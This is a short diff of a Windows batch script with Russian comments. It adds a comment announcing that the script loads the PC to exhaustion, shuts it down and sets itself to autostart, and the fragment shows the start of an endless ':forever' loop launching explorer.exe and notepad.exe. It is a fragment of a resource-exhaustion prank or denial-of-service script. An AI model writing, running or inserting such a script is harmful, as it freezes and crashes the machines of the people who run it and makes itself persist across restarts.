@@ -2,6 +2,8 @@
 
 :: (Переменная циклов)
 set "cycles=0"
+
+:: (Нагрузка на ПК и выключение. Авто запуск предусмотрен!)
 :forever
 start explorer.exe
 start notepad.exe
